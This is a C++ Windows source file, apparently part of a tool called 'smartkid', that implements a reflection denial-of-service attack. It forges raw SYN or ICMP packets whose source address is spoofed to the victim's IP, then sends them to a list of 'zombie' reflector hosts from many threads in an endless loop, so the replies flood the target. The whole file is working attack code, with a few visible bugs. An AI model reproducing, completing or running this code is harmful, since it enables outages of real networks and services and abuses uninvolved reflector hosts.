#include "StdAfx.h"
#include "socksupport.h"
#include "drdos.h"
#include "smartkidDlg.h"

CDrdos::CDrdos(void)
{
}

CDrdos::~CDrdos(void)
{
}
typedef struct _ip_port
{
	u_long  ip;
	u_short port;
}IPPORT;

vector<CString> CDrdos::m_reflectlist;
CCriticalSection CDrdos::m_Sync;
link_type	CDrdos::m_drdostype;
u_short 	CDrdos::m_ncounter=0;
u_short 	CDrdos::m_threadnum=0;
u_short 	CDrdos::m_mainnum=0;
u_short		CDrdos::m_listCounter=0;
u_long		CDrdos::m_source_ip=0;
char		CDrdos::m_target_ip[16]={0};
u_short		CDrdos::m_target_port;
u_short		CDrdos::m_source_port;
u_long	    CDrdos::m_seq_num;

volatile SOCKET			 CDrdos::sock;
volatile SOCKADDR_IN	 CDrdos::syn_in; 
volatile SOCKADDR_IN	 CDrdos::icmp_in; 

volatile IP_HEADER	 CDrdos::ipheader;  
volatile TCP_HEADER	 CDrdos::tcpheader;  
volatile PSD_HEADER	 CDrdos::psdheader;
volatile ICMP_HEADER CDrdos::icmpheader; 

CsmartkidDlg* CDrdos::m_pDlg=0;

void CDrdos::InitSynPacket()
{
	//填充IP首部  
	memset((void *)&ipheader,0,sizeof(ipheader));
	ipheader.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long));  
	ipheader.tos=0;  
	ipheader.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));  
	ipheader.ident=1;  
	ipheader.frag_and_flags=0x40;  
	ipheader.ttl=255;	//最大 
	ipheader.proto=IPPROTO_TCP;  
	ipheader.checksum=0;  
	ipheader.sourceIP=inet_addr(m_target_ip);
	ipheader.destIP=inet_addr(m_target_ip);

	//填充Tcp首部  
	memset((void *)&tcpheader,0,sizeof(tcpheader));
	tcpheader.th_dport=htons(m_target_port);  
	tcpheader.th_sport=htons(m_target_port);  
	tcpheader.th_seq=htonl(rand());  
	tcpheader.th_ack=0;  
	tcpheader.th_lenres=(sizeof(TCP_HEADER)/4<<4|0);  
	tcpheader.th_flag=2;  //syn 00000010 修改这里来实现不同的标志位探测，2是SYN，1是FIN，16是ACK探测 
	tcpheader.th_win=htons(512);  
	tcpheader.th_urp=0;  
	tcpheader.th_sum=0;  

	//填充TCP伪首部用来计算TCP头部的效验和  
	memset((void *)&psdheader,0,sizeof(psdheader));
	psdheader.saddr=ipheader.sourceIP;  
	psdheader.daddr=ipheader.destIP;  
	psdheader.mbz=0;  
	psdheader.ptcl=IPPROTO_TCP;  
	psdheader.tcpl=htons(sizeof(TCP_HEADER)); 
}

void CDrdos::InitIcmpPacket()
{
	//填充IP首部  
	memset((void *)&ipheader,0,sizeof(ipheader));
	ipheader.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long));  
	ipheader.tos=0;  
	ipheader.total_len=htons(sizeof(IP_HEADER)+sizeof(ICMP_HEADER));  
	ipheader.ident=1;  
	ipheader.frag_and_flags=0x40;  
	ipheader.ttl=255;	//最大 
	ipheader.proto=IPPROTO_ICMP;  
	ipheader.checksum=0;  
	ipheader.sourceIP=inet_addr(m_target_ip);
	ipheader.destIP=inet_addr(m_target_ip);

	//填充ICMP首部
	memset((void *)&icmpheader,0,sizeof(icmpheader));
	icmpheader.ih_type=8;
	icmpheader.ih_code=0;
	icmpheader.ih_cksum=0;
	icmpheader.ih_id=(USHORT)GetCurrentProcessId();
	icmpheader.ih_seq=htons(u_short(rand()));
	icmpheader.ih_timestamp=htonl(GetTickCount());
}

UINT CDrdos::syn_drdosthread(LPVOID param)
{
	m_Sync.Lock();
	m_ncounter++;	
	m_Sync.Unlock();

	IPPORT *reflect_ip_port = (IPPORT*)param;
	
	//sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	if(sock ==INVALID_SOCKET)
	{  
		PrintError("WSASocket");
	}

	BOOL flag=true;  
	int ret=setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag));
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	int nTimeOut =2000;//2s  
	ret=setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&nTimeOut,sizeof(nTimeOut)); 
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	ret=setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&nTimeOut,sizeof(nTimeOut)); 
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	u_long seq_num = MakeRand32(m_ncounter); 

	ipheader.destIP=reflect_ip_port->ip;
	ipheader.ident = rand();
	ipheader.checksum = 0;

	tcpheader.th_dport =reflect_ip_port->port;
	tcpheader.th_seq = htonl(seq_num);
	tcpheader.th_sum = 0;

	psdheader.daddr = ipheader.destIP;

	//计算校验和  
	char SendBuff[128]={0};  

	//计算TCP校验和 
	memcpy(SendBuff, (void *)&psdheader, sizeof(PSD_HEADER));  
	memcpy(SendBuff+sizeof(PSD_HEADER), (void *)&tcpheader, sizeof(TCP_HEADER));  
	tcpheader.th_sum=checksum((u_short *)SendBuff,sizeof(PSD_HEADER)+sizeof(TCP_HEADER)); 

	/////////
	//计算IP检验和
	memcpy(SendBuff,(void *) &ipheader, sizeof(IP_HEADER));  
	memcpy(SendBuff+sizeof(IP_HEADER), (void *)&tcpheader, sizeof(TCP_HEADER));  
	memset(SendBuff+sizeof(IP_HEADER)+sizeof(TCP_HEADER),0,4);
	ipheader.checksum=checksum((u_short *)SendBuff,sizeof(IP_HEADER));
	memcpy(SendBuff,(void *) &ipheader, sizeof(IP_HEADER));  

	memset((void *)&syn_in,0,sizeof(syn_in));
	syn_in.sin_family = AF_INET;  
	syn_in.sin_addr.s_addr = reflect_ip_port->ip; 
	syn_in.sin_port =reflect_ip_port->port;  
	//发送数据包  
	ret=sendto(sock, SendBuff, sizeof(IP_HEADER)+sizeof(TCP_HEADER), 0, (struct sockaddr*)&syn_in, sizeof(syn_in)); 
	if(ret==SOCKET_ERROR)  
	{  
		closesocket(sock);
		PrintError("sendto");
	}  

	//关闭套接口
	closesocket(sock);
	return 0;  
}

UINT CDrdos::icmp_drdosthread(LPVOID param)
{
	m_Sync.Lock();
	m_ncounter++;	
	m_Sync.Unlock();

	
	IPPORT *reflect_ip_port = (IPPORT*)param;
	
	//sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	if(sock ==INVALID_SOCKET)
	{  
		PrintError("WSASocket");
	}

	BOOL flag=true;  
	int ret=setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag));
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	int nTimeOut =2000;//2s  
	ret=setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&nTimeOut,sizeof(nTimeOut)); 
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	ret=setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&nTimeOut,sizeof(nTimeOut)); 
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	u_short seq_num = MakeRand16(m_ncounter); 


	ipheader.destIP = reflect_ip_port->ip;
	ipheader.ident = rand();
	ipheader.checksum = 0;

	icmpheader.ih_cksum=0;
	icmpheader.ih_id=(USHORT)GetCurrentProcessId();
	icmpheader.ih_seq=htons(seq_num);
	icmpheader.ih_timestamp=htonl(GetTickCount());

	//计算ICMP校验和 
	icmpheader.ih_cksum=checksum((u_short *)&icmpheader,sizeof(ICMP_HEADER));

	char SendBuff[128]={0};  
	//计算IP检验和
	memcpy(SendBuff, (void *)&ipheader, sizeof(IP_HEADER));  
	memcpy(SendBuff+sizeof(IP_HEADER), (void *)&icmpheader, sizeof(ICMP_HEADER));  
	ipheader.checksum=checksum((u_short *)SendBuff,sizeof(IP_HEADER));
	memcpy(SendBuff,(void *) &ipheader, sizeof(IP_HEADER));  

	memset((void *)&syn_in,0,sizeof(syn_in));
	syn_in.sin_family = AF_INET;  
	syn_in.sin_addr.s_addr = reflect_ip_port->ip; 
	syn_in.sin_port =reflect_ip_port->port;  

	//发送数据包  
	ret=sendto(sock, SendBuff, sizeof(IP_HEADER)+sizeof(TCP_HEADER), 0, (struct sockaddr*)&icmp_in, sizeof(icmp_in)); 
	if(ret==SOCKET_ERROR)  
	{  
		closesocket(sock);
		PrintError("sendto");
	}  

	//关闭套接口
	closesocket(sock);
	return 0;  
}

void CDrdos::start_drdos(const vector<CString> &reflect_list)
{
	m_listCounter=0;
	m_ncounter=0;
	m_pDlg=(CsmartkidDlg*)AfxGetApp()->GetMainWnd();
	m_threadnum=m_pDlg->m_threadnum;
	m_drdostype=m_pDlg->m_drdostype;
	strcpy(m_target_ip,m_pDlg->m_targetip.GetBuffer());
	m_target_port=m_pDlg->m_drdosport;
	m_reflectlist=reflect_list;

	switch(m_drdostype) 
	{
	case _SYN:
		{
			//开始初始化数据包 
			InitSynPacket(); 
			break;
		}
	case _ICMP:
		{
			//开始初始化数据包 
			InitIcmpPacket(); 
			break;
		}
	}
	m_mainnum=m_reflectlist.size()/m_threadnum;
	if(m_reflectlist.size()%m_threadnum > 0)
	{
		m_mainnum++;
	}
	m_pDlg->m_prog->SetRange(0,m_reflectlist.size());
	m_pDlg->m_prog->SetStep(1);
	AfxBeginThread(drdosthread,NULL); 
}

UINT CDrdos::drdosthread(LPVOID param)
{
	CWinThread *wt[1024];
	HANDLE hThread[1024];
	u_short nThreadCounter;

	CString reflect_ip_port;
	IPPORT  ip_port;

	//建立发送包线程
	switch(m_drdostype) 
	{
	case _SYN:
		{
			while(1)
			{
				for(int i=0;i<m_mainnum;i++)
				{
					nThreadCounter=0;
					//每次批量创建的线程实际个数,最后一次是一个余数值
					for(int j=0;j<m_threadnum;j++)
					{
						if(g_stop==true)
						{
							break;
						}

						reflect_ip_port=m_reflectlist[j];
						int index=reflect_ip_port.Find (":",0);

						char zombies_ip[16];
						memset(zombies_ip,0,sizeof(zombies_ip));
						memcpy(zombies_ip,reflect_ip_port,index);

						ip_port.ip=inet_addr(zombies_ip);
						ip_port.port= htons(atoi(reflect_ip_port.Right(reflect_ip_port.GetLength() - index - 1)));
						//内循环计数
						nThreadCounter++;
						m_pDlg->m_prog->StepIt();
						wt[j]=AfxBeginThread(syn_drdosthread,&ip_port);
						hThread[j]=wt[j]->m_hThread;
					}		
					hThread[j]=NULL;//非常重要,因为当执行if(m_ncounter>m_portnum-1)时是中断的，此时hThread[j]无值
					//如果k=0，表示没有开启线程
					if(j!=0)
					{
						WaitForMultipleObjects(nThreadCounter,hThread,TRUE,500);
					}
				}
				m_pDlg->m_prog->SetPos(0);
			}
			break;
		}			
	case _ICMP:
		{			
			while(1)
			{
				for(int i=0;i<m_mainnum;i++)
				{
					nThreadCounter=0;
					//每次批量创建的线程实际个数,最后一次是一个余数值
					for(int j=0;j<m_threadnum;j++)
					{
						if(g_stop==true)
						{
							break;
						}

						reflect_ip_port=m_reflectlist[j];
						int index=reflect_ip_port.Find (":",0);

						char zombies_ip[16];
						memset(zombies_ip,0,sizeof(zombies_ip));
						memcpy(zombies_ip,reflect_ip_port,index);

						ip_port.ip=inet_addr(zombies_ip);
						ip_port.port= htons(atoi(reflect_ip_port.Right(reflect_ip_port.GetLength() - index - 1)));
						//内循环计数
						nThreadCounter++;
						m_pDlg->m_prog->StepIt();
						wt[j]=AfxBeginThread(icmp_drdosthread,&ip_port);
						hThread[j]=wt[j]->m_hThread;
					}		
					hThread[j]=NULL;//非常重要,因为当执行if(m_ncounter>m_portnum-1)时是中断的，此时hThread[j]无值
					//如果k=0，表示没有开启线程
					if(j!=0)
					{
						WaitForMultipleObjects(nThreadCounter,hThread,TRUE,500);
					}
				}
				m_pDlg->m_prog->SetPos(0);
			}
			break;
		}
	}
	m_pDlg->m_prog->SetPos(0);
	return 0;
}
